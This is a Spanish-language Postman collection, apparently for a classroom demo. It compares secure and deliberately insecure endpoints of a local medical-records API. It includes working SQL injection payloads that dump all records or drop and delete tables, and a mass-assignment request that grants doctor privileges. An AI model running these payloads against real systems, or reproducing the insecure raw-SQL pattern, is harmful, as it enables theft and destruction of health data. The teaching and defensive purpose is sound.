@@ -1,0 +1,567 @@
+{
+	"info": {
+		"_postman_id": "28272012-55bf-417c-ae90-c2cdba5473ed",
+		"name": "Sistema de Expedientes Médicos - API REST (SQLite)",
+		"description": "Colección completa para probar el Sistema de Expedientes Médicos.\n\n## ⚠️ Importante: Limitaciones de SQLite\n\nEsta colección está configurada para **SQLite**. Algunos ataques de SQL Injection NO funcionarán debido a limitaciones técnicas de SQLite:\n\n❌ **NO FUNCIONAN en SQLite:**\n- DROP TABLE con `;` (bloqueado por `execute()`)\n- DELETE con `;` (bloqueado por `execute()`)\n- Múltiples sentencias separadas por `;`\n\n✅ **SÍ FUNCIONAN en SQLite:**\n- OR-based injection (`' OR '1'='1`)\n- Comment injection (`'--`)\n- UNION attacks\n- Asignación Masiva\n\n## 📌 Para Ver DROP TABLE Funcionando\n\nMigra a MySQL siguiendo: `GUIA_MIGRACION_MYSQL.md`\n\n## Estructura\n- ✅ Endpoints Seguros: Utilizan ORM y serializadores\n- ⚠️ Endpoints Inseguros: Vulnerables a SQL Injection\n- 🔴 Ejemplos de Ataques: Ataques que SÍ funcionan\n- 🚫 Ataques Bloqueados: Ataques que NO funcionan en SQLite",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "36255323"
+	},
+	"item": [
+		{
+			"name": "1. Servicio de Pacientes (Puerto 8000)",
+			"item": [
+				{
+					"name": "Endpoints Seguros ✅",
+					"item": [
+						{
+							"name": "Registrar Paciente (Seguro)",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"nombre\": \"María González López\",\n    \"fecha_nacimiento\": \"1985-03-20\",\n    \"nss\": \"98765432101\",\n    \"email\": \"maria.gonzalez@example.com\",\n    \"password\": \"MiPassword123\",\n    \"es_doctor\": false\n}"
+								},
+								"url": {
+									"raw": "{{base_url_pacientes}}/api/pacientes/seguro/registro",
+									"host": [
+										"{{base_url_pacientes}}"
+									],
+									"path": [
+										"api",
+										"pacientes",
+										"seguro",
+										"registro"
+									]
+								},
+								"description": "**Endpoint Seguro** que registra un nuevo paciente utilizando:\n- ✅ ORM de Django (previene SQL Injection)\n- ✅ Serializador con validaciones\n- ✅ Hasheo automático de contraseñas\n\n**Protecciones:**\n- Funciona en SQLite, MySQL, PostgreSQL, etc.\n- Previene TODOS los tipos de SQL Injection\n- Validación automática de datos"
+							},
+							"response": []
+						},
+						{
+							"name": "Registrar Doctor (Seguro)",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"nombre\": \"Dr. Carlos Ramírez Soto\",\n    \"fecha_nacimiento\": \"1975-08-15\",\n    \"nss\": \"11223344556\",\n    \"email\": \"carlos.ramirez@clinica.com\",\n    \"password\": \"DocPassword456\",\n    \"es_doctor\": true\n}"
+								},
+								"url": {
+									"raw": "{{base_url_pacientes}}/api/pacientes/seguro/registro",
+									"host": [
+										"{{base_url_pacientes}}"
+									],
+									"path": [
+										"api",
+										"pacientes",
+										"seguro",
+										"registro"
+									]
+								},
+								"description": "Registra un nuevo **doctor** en el sistema.\n\nNota: El campo `es_doctor: true` identifica que esta persona es un doctor."
+							},
+							"response": []
+						},
+						{
+							"name": "Actualizar Perfil (Seguro)",
+							"request": {
+								"method": "PUT",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"nombre\": \"María González López de Pérez\",\n    \"email\": \"maria.gonzalez.nuevo@example.com\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url_pacientes}}/api/pacientes/seguro/perfil/1",
+									"host": [
+										"{{base_url_pacientes}}"
+									],
+									"path": [
+										"api",
+										"pacientes",
+										"seguro",
+										"perfil",
+										"1"
+									]
+								},
+								"description": "**Endpoint Seguro** para actualizar el perfil de un paciente.\n\n**Protecciones:**\n- ✅ Solo permite modificar campos específicos (nombre, email)\n- ✅ El campo `es_doctor` NO puede ser modificado (read-only)\n- ✅ Previene Asignación Masiva"
+							},
+							"response": []
+						}
+					],
+					"description": "Endpoints que utilizan **ORM** y **serializadores** para garantizar la seguridad."
+				},
+				{
+					"name": "Endpoints Inseguros ⚠️",
+					"item": [
+						{
+							"name": "Registrar Paciente (Inseguro)",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"nombre\": \"Pedro Martínez\",\n    \"fecha_nacimiento\": \"1992-11-10\",\n    \"nss\": \"55566677788\",\n    \"email\": \"pedro.martinez@example.com\",\n    \"password\": \"Pedro123\",\n    \"es_doctor\": false\n}"
+								},
+								"url": {
+									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/registro",
+									"host": [
+										"{{base_url_pacientes}}"
+									],
+									"path": [
+										"api",
+										"pacientes",
+										"inseguro",
+										"registro"
+									]
+								},
+								"description": "**⚠️ ENDPOINT INSEGURO - SOLO PARA DEMOSTRACIÓN**\n\nVulnerabilidades:\n- ❌ Usa SQL RAW sin preparar\n- ❌ Vulnerable a SQL Injection\n- ❌ Concatenación directa de strings\n\n**NOTA SQLite:** Algunos ataques (DROP TABLE con `;`) NO funcionan en SQLite debido a limitaciones de `cursor.execute()`."
+							},
+							"response": []
+						},
+						{
+							"name": "Actualizar Perfil (Inseguro)",
+							"request": {
+								"method": "PUT",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"nombre\": \"Pedro Martínez Actualizado\",\n    \"email\": \"pedro.nuevo@example.com\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/perfil/3",
+									"host": [
+										"{{base_url_pacientes}}"
+									],
+									"path": [
+										"api",
+										"pacientes",
+										"inseguro",
+										"perfil",
+										"3"
+									]
+								},
+								"description": "**⚠️ ENDPOINT INSEGURO**\n\nVulnerabilidades:\n- ❌ SQL Injection\n- ❌ Asignación Masiva (permite modificar `es_doctor`)"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Ataques que SÍ Funcionan en SQLite ✅🔴",
+					"item": [
+						{
+							"name": "✅ Asignación Masiva - Convertirse en Doctor",
+							"request": {
+								"method": "PUT",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"nombre\": \"Atacante Malicioso\",\n    \"email\": \"atacante@evil.com\",\n    \"es_doctor\": true\n}"
+								},
+								"url": {
+									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/perfil/3",
+									"host": [
+										"{{base_url_pacientes}}"
+									],
+									"path": [
+										"api",
+										"pacientes",
+										"inseguro",
+										"perfil",
+										"3"
+									]
+								},
+								"description": "**✅ ESTE ATAQUE SÍ FUNCIONA EN SQLITE**\n\n**🔴 ATAQUE: Asignación Masiva**\n\n**Objetivo:** Elevar privilegios de un paciente común a doctor\n\n**Payload:**\n```json\n{\n    \"es_doctor\": true\n}\n```\n\n**¿Qué hace?**\nExplota la falta de validación de campos permitidos para modificar el campo `es_doctor` sin autorización.\n\n**Resultado Esperado:**\n- ✅ El campo `es_doctor` cambia de `false` a `true`\n- ✅ Un paciente obtiene privilegios de doctor\n- ✅ Funciona igual en SQLite, MySQL, PostgreSQL\n\n**Mitigación:**\nEl endpoint seguro usa un serializador con campos explícitos y `es_doctor` como `read_only`."
+							},
+							"response": []
+						}
+					],
+					"description": "Ataques que **SÍ funcionan** en SQLite"
+				},
+				{
+					"name": "Ataques Bloqueados por SQLite 🚫",
+					"item": [
+						{
+							"name": "🚫 DROP TABLE - NO Funciona en SQLite",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"nombre\": \"Test'; DROP TABLE pacientes_paciente; --\",\n    \"fecha_nacimiento\": \"1990-01-01\",\n    \"nss\": \"99999999999\",\n    \"email\": \"hacker@test.com\",\n    \"password\": \"test123\",\n    \"es_doctor\": false\n}"
+								},
+								"url": {
+									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/registro",
+									"host": [
+										"{{base_url_pacientes}}"
+									],
+									"path": [
+										"api",
+										"pacientes",
+										"inseguro",
+										"registro"
+									]
+								},
+								"description": "**🚫 ESTE ATAQUE NO FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\nTest'; DROP TABLE pacientes_paciente; --\n```\n\n**Resultado Esperado en SQLite:**\n```json\n{\n    \"error\": \"near \\\";\\\": syntax error\",\n    \"mensaje\": \"Error al registrar paciente\"\n}\n```\n\n**¿Por qué NO funciona?**\n- SQLite usa `cursor.execute()` que solo permite **UNA sentencia SQL** por llamada\n- Cuando detecta un `;` seguido de otra sentencia, lanza error de sintaxis\n- Esto NO es una protección del código, sino una limitación del motor de BD\n\n**¿El código es seguro?**\n❌ **NO** - El código SIGUE siendo vulnerable:\n- En MySQL/PostgreSQL este ataque SÍ funcionaría\n- La \"protección\" es accidental, no intencional\n- Otros ataques (OR-based) SÍ funcionan\n\n**Para ver este ataque funcionando:**\nMigra a MySQL siguiendo `GUIA_MIGRACION_MYSQL.md`\n\n**Conclusión:**\nNO debes depender de características del motor de BD para seguridad. Usa siempre un ORM."
+							},
+							"response": []
+						},
+						{
+							"name": "🚫 DELETE Malicioso - NO Funciona en SQLite",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"nombre\": \"Test'; DELETE FROM pacientes_paciente WHERE '1'='1'; --\",\n    \"fecha_nacimiento\": \"1990-01-01\",\n    \"nss\": \"88888888888\",\n    \"email\": \"delete@test.com\",\n    \"password\": \"test123\",\n    \"es_doctor\": false\n}"
+								},
+								"url": {
+									"raw": "{{base_url_pacientes}}/api/pacientes/inseguro/registro",
+									"host": [
+										"{{base_url_pacientes}}"
+									],
+									"path": [
+										"api",
+										"pacientes",
+										"inseguro",
+										"registro"
+									]
+								},
+								"description": "**🚫 ESTE ATAQUE NO FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\nTest'; DELETE FROM pacientes_paciente WHERE '1'='1'; --\n```\n\n**Objetivo:** Eliminar todos los registros de pacientes\n\n**Resultado en SQLite:**\nError de sintaxis (bloqueado por `execute()`)\n\n**En MySQL:**\n✅ Eliminaría todos los registros de la tabla\n\n**Moraleja:**\nEl código es vulnerable independientemente del motor de BD usado."
+							},
+							"response": []
+						}
+					],
+					"description": "Ataques que **NO funcionan** en SQLite por limitaciones técnicas.\n\n⚠️ **IMPORTANTE:** Estos ataques SÍ funcionarían en MySQL/PostgreSQL."
+				}
+			]
+		},
+		{
+			"name": "2. Servicio de Expedientes (Puerto 8001)",
+			"item": [
+				{
+					"name": "Endpoints Seguros ✅",
+					"item": [
+						{
+							"name": "Crear Nota Médica (Seguro)",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"id_paciente\": 1,\n    \"id_doctor\": 2,\n    \"fecha_consulta\": \"2025-10-31T14:30:00\",\n    \"diagnostico\": \"Gripe estacional con fiebre de 38.5°C, dolor de garganta y congestión nasal.\",\n    \"tratamiento\": \"Reposo absoluto por 3 días. Paracetamol 500mg cada 8 horas. Abundantes líquidos.\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url_expedientes}}/api/expedientes/seguro/crear",
+									"host": [
+										"{{base_url_expedientes}}"
+									],
+									"path": [
+										"api",
+										"expedientes",
+										"seguro",
+										"crear"
+									]
+								},
+								"description": "**Endpoint Seguro** para crear una nueva nota médica.\n\n**Protecciones:**\n- ✅ Utiliza ORM de Django\n- ✅ Previene SQL Injection\n- ✅ Valida campos con serializador"
+							},
+							"response": []
+						},
+						{
+							"name": "Buscar Expedientes por NSS (Seguro)",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url_expedientes}}/api/expedientes/seguro/buscar?nss=98765432101",
+									"host": [
+										"{{base_url_expedientes}}"
+									],
+									"path": [
+										"api",
+										"expedientes",
+										"seguro",
+										"buscar"
+									],
+									"query": [
+										{
+											"key": "nss",
+											"value": "98765432101"
+										}
+									]
+								},
+								"description": "**Endpoint Seguro** para buscar todas las notas médicas de un paciente.\n\n**Protecciones:**\n- ✅ Utiliza ORM con filtros seguros\n- ✅ Previene SQL Injection"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Endpoints Inseguros ⚠️",
+					"item": [
+						{
+							"name": "Crear Nota Médica (Inseguro)",
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"id_paciente\": 1,\n    \"id_doctor\": 2,\n    \"fecha_consulta\": \"2025-10-31T16:00:00\",\n    \"diagnostico\": \"Hipertensión arterial leve\",\n    \"tratamiento\": \"Losartán 50mg cada 24 horas\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/crear",
+									"host": [
+										"{{base_url_expedientes}}"
+									],
+									"path": [
+										"api",
+										"expedientes",
+										"inseguro",
+										"crear"
+									]
+								},
+								"description": "**⚠️ ENDPOINT INSEGURO**\n\nVulnerabilidades:\n- ❌ Usa SQL RAW\n- ❌ Vulnerable a SQL Injection"
+							},
+							"response": []
+						},
+						{
+							"name": "Buscar Expedientes por NSS (Inseguro)",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=98765432101",
+									"host": [
+										"{{base_url_expedientes}}"
+									],
+									"path": [
+										"api",
+										"expedientes",
+										"inseguro",
+										"buscar"
+									],
+									"query": [
+										{
+											"key": "nss",
+											"value": "98765432101"
+										}
+									]
+								},
+								"description": "**⚠️ ENDPOINT INSEGURO**\n\nVulnerabilidades:\n- ❌ SQL RAW con concatenación directa\n- ❌ Vulnerable a SQL Injection"
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Ataques que SÍ Funcionan en SQLite ✅🔴",
+					"item": [
+						{
+							"name": "✅ SQL Injection - Obtener TODOS los Expedientes",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=123' OR '1'='1",
+									"host": [
+										"{{base_url_expedientes}}"
+									],
+									"path": [
+										"api",
+										"expedientes",
+										"inseguro",
+										"buscar"
+									],
+									"query": [
+										{
+											"key": "nss",
+											"value": "123' OR '1'='1"
+										}
+									]
+								},
+								"description": "**✅ ESTE ATAQUE SÍ FUNCIONA EN SQLITE**\n\n**🔴 ATAQUE: SQL Injection - OR-Based**\n\n**Payload:**\n```sql\n123' OR '1'='1\n```\n\n**¿Qué hace?**\nManipula la consulta SQL para que la condición sea siempre verdadera:\n\n**Query original:**\n```sql\nSELECT * FROM expedientes WHERE nss = '98765432101'\n```\n\n**Query inyectada:**\n```sql\nSELECT * FROM expedientes WHERE nss = '123' OR '1'='1'\n```\n\n**Resultado Esperado:**\n- ✅ Devuelve **TODOS** los expedientes médicos de la base de datos\n- ✅ Funciona en SQLite, MySQL, PostgreSQL, etc.\n- ❌ Violación masiva de privacidad médica\n\n**Impacto:**\n- Exposición de datos sensibles de salud\n- Violación de confidencialidad médica\n- Incumplimiento de HIPAA, LGPD, etc.\n\n**Mitigación:**\n```python\n# ✅ Seguro - Usando ORM\npaciente = Paciente.objects.filter(nss=nss).first()\n```"
+							},
+							"response": []
+						},
+						{
+							"name": "✅ SQL Injection - Always True",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=' OR 1=1 OR ''='",
+									"host": [
+										"{{base_url_expedientes}}"
+									],
+									"path": [
+										"api",
+										"expedientes",
+										"inseguro",
+										"buscar"
+									],
+									"query": [
+										{
+											"key": "nss",
+											"value": "' OR 1=1 OR ''='"
+										}
+									]
+								},
+								"description": "**✅ ESTE ATAQUE SÍ FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\n' OR 1=1 OR ''='\n```\n\n**Resultado:**\n✅ Devuelve todos los registros (condición siempre verdadera)"
+							},
+							"response": []
+						},
+						{
+							"name": "✅ SQL Injection - Comment-Based",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=98765432101' --",
+									"host": [
+										"{{base_url_expedientes}}"
+									],
+									"path": [
+										"api",
+										"expedientes",
+										"inseguro",
+										"buscar"
+									],
+									"query": [
+										{
+											"key": "nss",
+											"value": "98765432101' --"
+										}
+									]
+								},
+								"description": "**✅ ESTE ATAQUE SÍ FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\n98765432101' --\n```\n\n**¿Qué hace?**\n`--` es un comentario en SQL que comenta el resto de la query.\n\n✅ Funciona en todos los motores de BD"
+							},
+							"response": []
+						}
+					],
+					"description": "Ataques OR-based que **SÍ funcionan** en SQLite"
+				},
+				{
+					"name": "Ataques Bloqueados por SQLite 🚫",
+					"item": [
+						{
+							"name": "🚫 DROP TABLE - NO Funciona en SQLite",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url_expedientes}}/api/expedientes/inseguro/buscar?nss=123'; DROP TABLE expedientes_notamedica; --",
+									"host": [
+										"{{base_url_expedientes}}"
+									],
+									"path": [
+										"api",
+										"expedientes",
+										"inseguro",
+										"buscar"
+									],
+									"query": [
+										{
+											"key": "nss",
+											"value": "123'; DROP TABLE expedientes_notamedica; --"
+										}
+									]
+								},
+								"description": "**🚫 ESTE ATAQUE NO FUNCIONA EN SQLITE**\n\n**Payload:**\n```sql\n123'; DROP TABLE expedientes_notamedica; --\n```\n\n**Resultado en SQLite:**\nError de sintaxis (bloqueado por `execute()`)\n\n**En MySQL/PostgreSQL:**\n✅ Eliminaría completamente la tabla de expedientes\n\n**Impacto en MySQL:**\n- ⚠️ **DESTRUCCIÓN TOTAL** de la tabla\n- Pérdida de información médica crítica\n- Daño catastrófico al sistema\n\n**Para ver este ataque funcionando:**\nMigra a MySQL con: `GUIA_MIGRACION_MYSQL.md`"
+							},
+							"response": []
+						}
+					]
+				}
+			]
+		},
+		{
+			"name": "📊 Resumen de Vulnerabilidades",
+			"item": [],
+			"description": "## Tabla Comparativa: Ataques en SQLite\n\n| Ataque | ¿Funciona en SQLite? | Endpoint Inseguro | Endpoint Seguro |\n| --- | --- | --- | --- |\n| **OR-Based** (`' OR '1'='1`) | ✅ SÍ | ❌ Vulnerable | ✅ Protegido |\n| **DROP TABLE** (`'; DROP...`) | 🚫 NO (bloqueado) | ⚠️ Código vulnerable | ✅ Protegido |\n| **DELETE** (`'; DELETE...`) | 🚫 NO (bloqueado) | ⚠️ Código vulnerable | ✅ Protegido |\n| **Comment** (`'--`) | ✅ SÍ | ❌ Vulnerable | ✅ Protegido |\n| **UNION** | ✅ SÍ | ❌ Vulnerable | ✅ Protegido |\n| **Asignación Masiva** | ✅ SÍ | ❌ Vulnerable | ✅ Protegido |"
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "base_url_pacientes",
+			"value": "http://localhost:8000",
+			"type": "string"
+		},
+		{
+			"key": "base_url_expedientes",
+			"value": "http://localhost:8001",
+			"type": "string"
+		}
+	]
+}
